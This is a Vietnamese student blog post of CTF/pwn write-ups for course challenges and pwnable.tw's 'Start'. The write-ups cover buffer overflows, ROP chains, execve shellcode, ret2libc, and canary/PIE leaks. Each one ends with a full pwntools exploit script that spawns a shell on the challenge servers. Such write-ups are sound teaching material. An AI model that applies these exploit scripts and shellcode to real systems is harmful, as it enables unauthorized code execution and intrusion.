---
title: "Phaphajian"
date: 2021-11-07T22:54:13+07:00
draft: false 
---

## Welcome đến với deadline của PhaPhaJian !

Đầy là 1 trong những deadline của mình trên trường do anh PhaPhaJian cho mình trên lớp, cũng là 1 dịp để quay lại những kỹ thuật mà mình đã học qua lúc trước 

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Phaphajian.jpg?raw=true)



### rop2
##### [Rop2](https://uithcm-my.sharepoint.com/:u:/g/personal/inseclab_hcmuit_edu_vn/EYd3UU7ocA1DipbNdbG32lkBa8ySQ2GQjnIOB6grKLWaSg?e=uNvgYj) - x86 - ret2text/ret2syscall: nc 45.122.249.68 10006

Đầu tiên chúng ta bước vào 1 thủ tục mà các pwner đều sẽ làm khi gặp 1 bài pwn đó chính là file và checksec để kiểm tra thông tin cung các cơ chế bảo vệ của file : 

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_filechecksec.png?raw=true)

Từ thông tin ở trên chúng ta thấy được vài điểm sau : 
  + Là file ELF 32 bit +  statically linked : Các tệp được statically linked được 'locked' với file binary tại thời điểm liên kết để chúng không bao giờ thay đổỉ.
  + Stack Canary found : Option này là cho chúng ta biết rằng cơ chế Canary đã được bật lên
  + NX enabled : Option này là không cho phép thực thi câu lệnh trên stack


Hhmmm đã có thông tin của bài này rồi, thì chúng ta có thể dùng IDA Pro để check flow của nó xem chúng ta khai thác như nào nhé :lau:  

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-Ch]

  setvbuf(stdout, 0, 2, 0);
  v4 = getegid();
  setresgid(v4, v4, v4);
  vuln();
  return 0;
}
```
Xem mã giã chúng ta thấy được bài không có gì bất thường :| cho tới khi gọi hàm vuln
```
int vuln()
{
  char v1[20]; // [esp+0h] [ebp-18h] BYREF

  puts("Can you ROP your way out of this one?");
  return gets(v1);
}
```
 Vào trong hàm Vuln chúng ta có thể thấy được hàm đang gọi hàm gets(s1) với s1 size == 20. Chúng ta có thể thấy được đây chính là lỗi bof nè 
 
Sau khi dùng IDA đi 1 vòng thì ta nhận ra vấn đề như sau : 
  + Lỗ hổng chúng ta khai thác lần này là Bof
  + Không có hàm flag hay hàm /bin/sh nào hết 
  + Offset đầu tiên là 20
  


Dựa vào 2 lần phân tích trên chúng ta có thể đưa ra các hướng exploit như là ret2syscall, ret2text, ROPgadget, ... Tuy nhiên lần này ta sẽ sử dụng ROPgadget cho lẹ nhé Hehe

Đã xác định được hướng đi của mình thì giờ chúng ta sang phần bypass canary và viết ROP, 1 ROP cơ bản như sau : 

Để leak được canary vì là chỉ có statically linked nên canary sẽ không bị thay đổi, nên chúng a có thể mở gdb lên để leak canary như sau : 

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_gdb_ret.png?raw=true)

Disassemble vuln và đặt breakpoint ở hàm gets, nhập vào 20 ký tự "a".

  

Sử dụng câu lệnh x/100x $esp để show stack frame cho chúng ta quan sát, chúng ta thấy được như sau : 

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_gdb_checkstack.png?raw=true)


  + Offset = 20 
  + Canary = 0x080da000
  + Save base pointer = 0xffffd008
Sau đó mới tới phần return address .

Từ đó chúng ta chuyển sang phần viết ROP.
  
```
pop eax ; ret
pop edx ; pop ecx ; pop ebx ; ret
/bin/sh
int80
```


Giờ thì dựa vào đoạn ROP trên chúng ta phải viết ra ROP phù hợp với binnary trên, nên sử dụng câu lệnh sau : 

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_popeax.png?raw=true)

Tuy nhiên mọi chuyện đâu có dễ dàng như thế, trong pop eax; ret chúng ta có thể thấy 1 byte là 0x0a đây là 1 bad byte đối với hàm gets, vì khi nhận byte này hàm gets sẽ nhận dạng nó là byte xuống dòng và kết thúc cái ROP của chúng ta
Haizz badbyte like badboiz :|


Thế là chúng ta có thể viết 1 cái rop khác không sử dụng pop eax;ret tuy nhiên điều này cần kiến thức về asm khá vững, còn mình thì ...... vừa không vững vừa lười nên mình đã quyết định đi 1 con đường khá táo bạo
sử dụng option bad bytes của tool ROPgadget.

 ![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_ropgadgetbadbyte.png?raw=true)
 
 Như thế chúng ta đã có được 1 gadget rồi.
 
 Gom 7749 thông tin phân tích được ở trên kia lại thành cái file exploit này nè :D 

```
from pwn import *
from struct import pack


BIN = "./rop2"
 
###ROP  --binary ./rop2 --rop --badbytes "0a"
p = b''

p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += b'/bin'
p += pack('<I', 0x080da060) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += b'//sh'
p += pack('<I', 0x080da064) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x08049563) # int 0x80
canary = 0x080da000
save_base_pointer = 0xffffd008
def exploit():
	payload = b"a"*20 + p32(canary) + p32(save_base_pointer) + p 
#	__breakpoint="""
#		b*0x080488d0
#		"""
#	gdb.attach(io,__breakpoint)
	io.recvuntil("Can you ROP your way out of this one?")
	io.sendline(payload)
	io.interactive()



#io = process(BIN)
io = remote("45.122.249.68",10006)
#context.log_level='debug'
exploit()


```
![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_flag.png?raw=true)


### ROPchain
##### ROPchain - x86 - ROP chains: nc 45.122.249.68 10002
[ROPchain](https://uithcm-my.sharepoint.com/personal/khoanh_hcmuit_edu_vn/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fkhoanh%5Fhcmuit%5Fedu%5Fvn%2FDocuments%2FTh%E1%BB%B1c%20H%C3%A0nh%2FCO%5FCHE%5FMADOC%2F2021%2FChallenge%2FROPchain&parent=%2Fpersonal%2Fkhoanh%5Fhcmuit%5Fedu%5Fvn%2FDocuments%2FTh%E1%BB%B1c%20H%C3%A0nh%2FCO%5FCHE%5FMADOC%2F2021%2FChallenge)

```
#include <stdio.h>

char shell[] = "/bin/sh";
void SetBuf(){
	setvbuf(stdout,0,_IONBF,0);
	setvbuf(stdin,0,_IONBF,0);
	setvbuf(stderr,0,_IONBF,0);
}
void Vuln(){
	char buf[128];
        puts("Insert ROP chain here:");
        read (0, &buf,0x100);
}
int main(){
	SetBuf();
	puts("Wanna.One");
	puts("Muon gioi phai lam viec kho");
	Vuln();
	return 0;
}

```


Đầy là 2 file source của bài này, tuy nhiên bài này có vẻ dễ hơn bài trên nhiều. Nhưng thủ tục vẫn là thủ tục :3 checksec thôi nàooo

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_checksec.png?raw=true)

Từ checksec ta thấy được canary đã được bật, same same bài trên nhỉ :D , chứ còn gì nữa nên làm các bước cũng tương tự như trên đi rồi tính tiếp ha

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_IDA.png?raw=true)


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int savedregs; // [esp+4h] [ebp+0h]

  SetBuf();
  puts();
  savedregs = 134922153;
  puts();
  Vuln();
  return 0;
}
```


```
int Vuln()
{
  char v1[132]; // [esp+0h] [ebp-88h] BYREF

  puts("Insert ROP chain here:");
  return read(0, v1, 256);
}
```
Dựa vào đoạn code trên thì có thể thấy được rằng với v1 chỉ có size là 132 nhưng hàm read lại được max là 256 byte điều đó đã xuất hiện lỗi bof rồi.


Sử dụng gdb để phân tích như sau

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_gdb_breakpoint.png?raw=true)


![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_gdb_stackframe.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_gdb_ret.png?raw=true)

Với offset từ IDA Pro chúng ta có thể dùng để xác định stack frame gồm những gì, từ đó suy ra offset.


Từ đó chúng ta chuyển sang phần viết ROP.
  
```
pop eax ; ret
pop edx ; pop ecx ; pop ebx ; ret
/bin/sh
int80
```


Giờ thì dựa vào đoạn ROP trên chúng ta phải viết ra ROP phù hợp với binnary trên, nên sử dụng câu lệnh sau : 

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_ropgadget.png?raw=true) 

![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_ropgadget_binsh.png?raw=true)

```
from pwn import *
from struct import pack


BIN = "./ROPchain"
HOST = "45.122.249.68" 
PORT = 10002
canary = 0x080d900a
save_base_pointer = 0xffffcff8





pop_eax = 0x080a89e6 #pop eax ; ret
pop_edx = 0x0806e051 #pop edx ; pop ecx ; pop ebx ; ret
bin_sh = 0x080d9068 #/bin/sh
int80 = 0x080495a3


def exploit():
	payload = b"a"*132 + p32(canary) + p32(save_base_pointer) 
	payload += p32(pop_eax) + p32(0xb)
	payload += p32(pop_edx) + p32(0) + p32(0) + p32(bin_sh)
	payload += p32(int80)
	# __breakpoint="""
	# 	b*main+67
	# 	"""
	# gdb.attach(io,__breakpoint)
	io.recvuntil("Insert ROP chain here:")
	io.sendline(payload)
	io.interactive()

# io = process(BIN)
# context.log_level='debug'
io = remote(HOST,PORT)
exploit()
```
![img](https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_flag.png?raw=true)


# PWNABLE.TW
## Start

Đề bài cung cấp cho chúng ta 1 file chương trình trên Linux, vì vậy để biết thì chúng ta phải xem thử xem nó làm cái gì nào!
.....
Sau khi chạy thì thấy rằng chương trình in ra dòng *Let's start the CTF:* sau đó get chuỗi chúng ta nhập vào bằng cách nào đó, để biết được cấu trúc chương trình thì chúng ta dùng gdb để disassemble chương trình ra và được hàm _start: 
```
   0x08048060 <+0>:	push   esp
   0x08048061 <+1>:	push   0x804809d
   0x08048066 <+6>:	xor    eax,eax
   0x08048068 <+8>:	xor    ebx,ebx
   0x0804806a <+10>:	xor    ecx,ecx
   0x0804806c <+12>:	xor    edx,edx
   0x0804806e <+14>:	push   0x3a465443
   0x08048073 <+19>:	push   0x20656874
   0x08048078 <+24>:	push   0x20747261
   0x0804807d <+29>:	push   0x74732073
   0x08048082 <+34>:	push   0x2774654c
   0x08048087 <+39>:	mov    ecx,esp
   0x08048089 <+41>:	mov    dl,0x14
   0x0804808b <+43>:	mov    bl,0x1
   0x0804808d <+45>:	mov    al,0x4
   0x0804808f <+47>:	int    0x80
   0x08048091 <+49>:	xor    ebx,ebx
   0x08048093 <+51>:	mov    dl,0x3c
   0x08048095 <+53>:	mov    al,0x3
   0x08048097 <+55>:	int    0x80
   0x08048099 <+57>:	add    esp,0x14
   0x0804809c <+60>:	ret    

```
Như chúng ta thấy thì code asm này khá thô, code dùng những phương thức đơn giản nhất đó chính là sys_call, ví dụ khi eax = 1 thì gọi sys_exit, sys_read = 3, sys_write = 4 ,...
Về việc in ra dòng *Let's start the CTF:* thì chương trình chỉ push chuỗi dưới dạng hex vào stack sau đó gọi sys_write để in ra mà thôi! 

Sau đó gọi sys_read để đọc input vào và tăng esp lên 0x14 để ret. Điều đó làm mình có thể suy đoán là stack này sẽ có độ dài là 0x14. 

Vậy thì không có lỗ hổng thông thường nào như gets(), ... được xuất hiện ở đây, điều đó có nghĩa là chúng ta chỉ việc đưa shellcode vào stack và thực hiện shell thôi!
Để thực hiện được việc gọi shellcode quyền năng là "/bin/sh" thì chúng ta search gg có shellcode sau : 
```
   0:   31 c9                   xor    ecx, ecx
   2:   f7 e1                   mul    ecx
   4:   51                      push   ecx
   5:   68 2f 2f 73 68          push   0x68732f2f
   a:   68 2f 62 69 6e          push   0x6e69622f
   f:   89 e3                   mov    ebx, esp
  11:   b0 0b                   mov    al, 0xb
  13:   cd 80                   int    0x80

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
```
Sau đó yêu cầu tiếp theo là chúng ta phải tìm được esp_addr thì mới có thể add shellcode vào và thực thi được, để tìm được thì chúng ta chú ý câu lệnh *" 0x08048087 <+39>:	mov    ecx,esp"* câu lệnh này có nghĩa là esp sẽ được đưa vào ecx nên từ đấy chúng ta có thể leak được esp sau đó tính toán stack trả về và đưa shellcode vào : 

```
from pwn import *

BIN = "./start"
DEBUG = 1

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
addr = 0x08048087 

io = process(BIN)
context.log_level = 'debug'
# io = remote("chall.pwnable.tw", 10000)


#_breakpoint = """
#		0x08048099
#	"""
#gdb.attach(io,_breakpoint)
io.recvuntil("CTF:")
payload = b'A' * 0x14 + p32(addr)
io.send(payload)
esp_addr = u32(io.recv(4))
 
print("[+]Esp address = ", hex(esp_addr))
 
payload = b'A' * 0x14 + p32(esp_addr + 0x14) + shellcode
io.sendline(payload)
io.interactive()
```










### Return2LibC_Once
##### Return2LibC_Once - x86 - ret2libc: nc 45.122.249.68 10011
File [BIN](), [LIBC]()

Qua tới bài này rồi thì ta sẽ không ôn lại những kỹ thuật cũ nữa sẽ làm lẹ lẹ lẹ để đi ngủ .

Làm thủ tục thì chúng ta thấy rằng, chỉ có NX là được bật và đây là 1 file 32 bit



Dùng IDA bắt lại và phân tích flow 


Ta rút ra được như sau : 
	+ Đề cho 2 file bin và lic => ret2libc
	+ 32 bits
	+ Dùng bof để exploit 
	+ Offset == 136
	
Từ đó chúng ta sử dụng ret2libc để exploit thôi nào. Theo bước đầu tiên chúng ta phải tìm ra version libc nhưng lần này đã được cho trước, điều đó có nghĩa là chúng ta đã nắm được tất cả offset của file bin này, từ system function hay các hàm khác như gets, puts,....

Tiếp theo phải leak được GOT từ PLT của các hàm trong version libc đang sử dụng để tính toán ra libc base 
```
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
example = elf.symbols['example']

payload = paswd + b"a"*(136-len(paswd)) + b"b"*4 + p32(puts_plt) + p32(example) + p32(puts_got)
```


Sau đó tính toán libc base và hoàn thành ROP 
```
bincall = binsh + libc_base
syscall = system + libc_base
```







Sao đó gom hết những mảnh nho nhỏ trên lại ta được file exploit như sau : 


```
from pwn import * 

context(arch = 'i386', os = 'linux', endian = 'little')
BIN = "./Return2LibC_Once"
elf = ELF(BIN)
#libc = ELF("libc6_amd64.so")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

pop_edi = 0x0804861a # pop edi ; pop ebp ; ret
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
example = elf.symbols['example']

print(hex(puts_plt))
print(hex(puts_got))
system = libc.symbols['system']
print(system)
binsh = next(libc.search(b'/bin/sh\x00'))
print(binsh)
ret = 0x08048362
paswd = b"CNSCzxc"
def exploit():
	payload = paswd + b"a"*(136-len(paswd)) + b"b"*4 + p32(puts_plt) + p32(example) + p32(puts_got)
	# __breakpoint="""
	# 	b*main+37
	# 	"""
	# gdb.attach(io, __breakpoint)
	io.recvuntil("Welcome my ctf player. Tell me your password:")
	io.sendline(payload)
	io.recvuntil("No!")
	print(io.recv())
	puts = u32(io.recv()[0:4])
	print("Puts leak : ",hex(puts))
	libc_base = puts-libc.symbols['puts']
	print("Lib_base : ",hex(libc_base))
	#io.recvuntil("Welcome my ctf player. Tell me your password:")
	bincall = binsh + libc_base
	syscall = system + libc_base
	print(bincall)
	print(syscall)
	payload = paswd + b"a"*(136-len(paswd)) + b"b"*4
	payload += p32(pop_edi) + p32(system) + p32(bincall)
	io.sendline(payload)
	io.interactive()


io = process(BIN)
context.log_level="debug"
exploit()
```

### Buf1
###### 


Bắt đầu run thử ./buf1 xem sao:
 
Khi nhập 1 string dài thì:

 
Ồ đã có lỗi. Bây giờ mình xem code assembly nó xem sao nào
 
Có hàm gets, đây là hàm đọc input, và chắc chắn nó gây ra lỗi. Tiếp tục bật IDA xem thử:

 
Trong đây có 1 hàm Puts_flag:

 
Khi check1 == 1, check2 ==2, check3 == 3 thì mình mới có flag! Vậy các biến check này đâu ra, tiếp tục xem trong IDA, ta thấy được 3 hàm như sau:

 
 
 
Từ đây mình có ý tưởng như sau: bây giờ chỉ cần set biến v0 = 1337, sau đó cho nó đi qua từng hàm một ở trên để các biến check được gán, sau đó Puts_flag là xong. Tiếp tục quay lại pwn_gdb để tìm cách thực thi nào~

 
Mình đặt break point ở main+92 là ngay chỗ gets, để xem mình nhập input vào nó sẽ nằm đâu trong stack, từ đó để mình chèn payload vào!
Mình nhập đoạn “aaaabbbbccccddddeeefff” để tiện kiểm tra xem. Show stack sau khi nhập:

 
Tiếp tục dùng lệnh “ni” đến ret, ta thấy tham số truyền vào là 0x7ffff7e12e00 là ở vị trí df3c và df38:

 
Đây là nơi mình truyền các địa chỉ hàm vào return address.
Bây giờ bỏ qua bước gán các biến check, mình thử xem nó truyền vào được hàm không đã:

Dùng lệnh “info functions”, mình có được tất cả địa chỉ của các hàm như sau:

 
Bây giờ thử chạy lại và truyền vào hàm Func1 thử xem được không, đồng thời kiểm tra xem biến kiểm tra nằm ở vị trí nào?
 
Đây là code thử để debug:

 
Bắt đầu truyền payload vào để thực thi thì thấy thành công vào Func1. Xem assembly hàm Func1, ta thấy ở hàng <+8> sẽ dùng giá trị của địa chỉ rbp-0x4 để so sánh với 0x539 (1337 ở hệ cơ số 10). 
 
Kiểm tra giá trị rbp:

 
Là đoạn eeeeffff mình nhập vào, bây giờ mình chỉ cần thay đổi thành 0x539 là oke. 
Vậy bài toán đã được giải quyết. Việc còn lại là truyền các địa chỉ của các hàm còn lại là xong.
Code solve:
 
 
```
from pwn import *

#io = process('./buf1')
io = remote("45.122.249.68", 10008)
elf = ELF('./buf1')


payload = b'aaaabbbbccccddddeeee' + p32(0x539) + p64(elf.sym['Func1']) + p64(elf.sym['Func2']) + p64(elf.sym['Func3']) + p64(elf.sym['Puts_flag'])
#print(payload)

print(io.recv())
pause()
io.sendline(payload)
print(io.recv())
io.sendline(payload)

#payload = p32(0x539) * 6 + p64(elf.sym['Func1']) + p64(elf.sym['Func2']) + p64(elf.sym['Func3']) + p64(elf.sym['Puts_flag'])

```

### Leak 


```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>

int xorlen = 0 ;
int count = 0 ;
int byte_count = 8;

void Random(char *stringrandom){
	FILE *fp;
	fp = fopen("/dev/urandom", "r");
	fread(stringrandom, 1, byte_count, fp);
	fclose(fp);
}
void Shell(){
    system("/bin/sh");
}

void Welcome(){
	puts("------------------------=--------------------------");
    puts("Sao ke la nghia vu cua nguoi lam tu thien");
	puts("------------------------=--------------------------");
}
void Read_Input(char *buf,unsigned int size){
	int ret ;
	ret = read(0,buf,size);
	if(ret <= 0){
		puts("read error");
		exit(1);
	}
}

void Handler(int signum){
	puts("Timeout");
	_exit(1);
}
void init(){
	setvbuf(stdout,0,_IONBF,0);
	setvbuf(stdin,0,_IONBF,0);
	setvbuf(stderr,0,_IONBF,0);
	signal(SIGALRM,Handler);
	alarm(180);
}



void Magic(){
	puts("Toi biet chinh xac so tien ban nhan tu thien");
	char str_random[8];
	char mystr[8];
	Random(&str_random);
	int index;
	puts("Toi se cho ban 2 goi y de xem so tien toi sao ke duoc tu tai khoan nhan tu thian cua ban");
	for(int i = 0; i < 2; i++){
		printf("\nvi tri: ",i);
		scanf("%d",&index);
		printf("Gia tri cho ban: ");
		write(1,&str_random[index],1);
	}
	printf("\nNhap so tien ban da di lam tu thien: ");
	Read_Input(mystr,8);
	if(!strncmp(str_random,mystr,8)){
		puts("Đuoc roi ban hoan toan minh bach, chuc mung ban");
	}
	else{
		puts("Ban da an chan tien tu thien, cong an se vao cuoc");
	}
	return;
}
int Vuln(){
    char bof[128];
	puts("Viet Nam se chien thang dai dich!!!");
    read(0, bof, 200);
	return 0;
}
void Menu(){
	puts("1: Sao ke tien tu thien");
	puts("2: bof");	
}
int main(){
	init();
    Welcome();
	int choice;
	while(1){
		Menu();
		scanf("%d",&choice);
		switch(choice){
			case 1:
				Magic();
				break;
			case 2:
				Vuln();
				break;
			default:
				puts("Chon sai roi!!!");
				
		}
	}
	return 0;	
}
```
Bài này đã cho sẵn source, sau khi dùng thủ tục để check thì ra thấy như sau : 



Các option protected đều được bật,... chà hơi gian nan đây, vậy công việc của chúng ta là phải leak đc canary và pie thì may ra mới có thể giải bài này. Nhưng leak bằng cách nào đây ???

may sao code có chức năng cho chúng ta thấy giá trị ở vị trí chúng ta nhập trong stack, vậy thì quá hay, chúng ta chỉ cần tìm ra các offset nữa thôi.



Lúc này đây thì gdb lên ngôi nhé, dựa vào kỹ năng dùng gdb thượng thừa vjproo gì đó thì chúng ta suy ra được offset của canary = 48, pie = 32 :D ảo ma canada qá nhỉ 

Nhưng thật ra các bạn phải debug gdb nhiều mới thấy được sự huyền diệu của nó :|



```
from pwn import *

BIN = "./leak"

# canary 48 
#libc main 64

def leakcanary():
    off = 48
    res = b''
    for i in range(8):
        print(io.recv())
        io.sendline('1')
        print(io.recvuntil('vi tri: '))
        io.sendline(str(off+i))
        print(io.recvuntil('Gia tri cho ban: '))
        res += io.recv(1)
        print(io.recvuntil('vi tri: '))
        io.sendline(str(1))
        print(io.recv())
        io.sendline(str(1))
    return u64(res)

def leakpie():
    off = 32
    res = b''
    for i in range(8):
        print(io.recv())
        io.sendline('1')
        print(io.recvuntil('vi tri: '))
        io.sendline(str(off+i))
        print(io.recvuntil('Gia tri cho ban: '))
        res += io.recv(1)
        print(io.recvuntil('vi tri: '))
        io.sendline(str(1))
        print(io.recv())
        io.sendline(str(1))
    return u64(res) - 793



def exploit():
	canary = leakcanary()
	shelladdr = leakpie() + 1

	print(io.recv())
	io.sendline('2')
	payload = b'A'*136 + p64(canary)*2 + p64(shelladdr)
	print(io.recv())
	io.sendline(payload)
	io.interactive()


io = process(BIN)
exploit()

```





















